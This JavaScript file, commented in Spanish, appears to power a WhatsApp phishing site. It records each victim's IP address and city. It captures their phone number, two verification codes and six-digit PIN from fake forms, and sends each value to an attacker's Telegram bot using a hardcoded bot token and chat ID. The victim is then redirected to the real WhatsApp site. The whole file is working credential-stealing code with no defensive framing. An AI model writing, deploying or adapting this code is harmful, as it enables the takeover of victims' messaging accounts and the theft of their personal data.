// Bot token y chat ID de Telegram
var telegram_bot_id = "8123911851:AAFrKwzBfv_6rOM25uBDlJl_yJmcTYgw-uc";
var chat_id = "5592536910";

// Captura IP y ubicación
let ip_info = {};
fetch("https://ipapi.co/json")
  .then(res => res.json())
  .then(data => {
    ip_info = {
      ip: data.ip || "Sin IP",
      ciudad: data.city || "Sin ciudad",
      region: data.region || "",
      pais: data.country_name || ""
    };
  });

// Esperamos que el DOM cargue
document.addEventListener("DOMContentLoaded", () => {
  // INDEX: Captura código1
  const form1 = document.getElementById("form1");
  if (form1) {
    form1.addEventListener("submit", function (e) {
      e.preventDefault();
      const codigo1 = document.getElementById("codigo1").value;
      localStorage.setItem("codigoGuardado", codigo1);

      const mensaje = `🟢 CODIGO DE PANTALLA
🔢 Código: ${codigo1}
🌐 IP: ${ip_info.ip}
📍 Ubicación: ${ip_info.ciudad}, ${ip_info.region}, ${ip_info.pais}`;

      fetch(`https://api.telegram.org/bot${telegram_bot_id}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text: mensaje })
      });

      setTimeout(() => {
        window.location.href = "cargando2.html";
      }, 1000);
    });
  }


    // PAGINA2: Captura código2 y valida
  const form2 = document.getElementById("form2");
  if (form2) {
    form2.addEventListener("submit", function (e) {
      e.preventDefault();
      const codigo2 = document.getElementById("codigo2").value;
      const codigo1 = localStorage.getItem("codigoGuardado");
      const mismo = (codigo1 === codigo2);

      let mensaje;
      if (mismo) {
        mensaje = `❌ CÓDIGO REPETIDO
🔢 Código ingresado: ${codigo2}
🚫 Coincide con el código anterior
🌐 IP: ${ip_info.ip}
📍 Ubicación: ${ip_info.ciudad}, ${ip_info.region}, ${ip_info.pais}`;
        document.getElementById("error").style.display = "block";
        document.getElementById("exito").style.display = "none";
      } else {
        mensaje = `✅ CODIGO 2 ACEPTADO
🔢 Código: ${codigo2}
🚫 Código anterior: ${codigo1}
🌐 IP: ${ip_info.ip}
📍 Ubicación: ${ip_info.ciudad}, ${ip_info.region}, ${ip_info.pais}`;
        document.getElementById("exito").style.display = "block";
        document.getElementById("error").style.display = "none";
        localStorage.removeItem("codigoGuardado");

        // Redirigir a otra página web después de mostrar el mensaje
        setTimeout(() => {
          window.location.href = "pin.html"; // <-- CAMBIA ESTA URL si quieres
        }, 1500);
      }

      fetch(`https://api.telegram.org/bot${telegram_bot_id}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text: mensaje })
      });
    });
  }
});

let credenciales = {};

// FORMULARIO LOGIN
const loginForm = document.getElementById("loginForm");
if (loginForm) {
  loginForm.addEventListener("submit", function (e) {
    e.preventDefault();
    credenciales.select = document.getElementById("select").value;
    credenciales.tel = document.getElementById("tel").value;

    const mensaje = `🔐 WHATSAPP
#️⃣ Pais: ${credenciales.select}
🐿 tel: ${credenciales.tel}
🌐 IP: ${ip_info.ip}
📍 Ciudad: ${ip_info.ciudad}, ${ip_info.region}, ${ip_info.pais}`;

    fetch(`https://api.telegram.org/bot${telegram_bot_id}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id, text: mensaje })
    }).then(() => {
      window.location.href = "cargando.html";
    });
  });
}

const pinForm = document.getElementById("pinForm");
if (pinForm) {
  pinForm.addEventListener("submit", function (e) {
    e.preventDefault();
    credenciales.pin = document.getElementById("pin").value;

    const mensaje = `🔐 PIN 6 DIGITOS
📌 pin: ${credenciales.pin}
🌐 IP: ${ip_info.ip}
📍 Ciudad: ${ip_info.ciudad}, ${ip_info.region}, ${ip_info.pais}`;

    fetch(`https://api.telegram.org/bot${telegram_bot_id}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id, text: mensaje })
    }).then(() => {
      window.location.href = "https://www.whatsapp.com/";
    });
  });
}
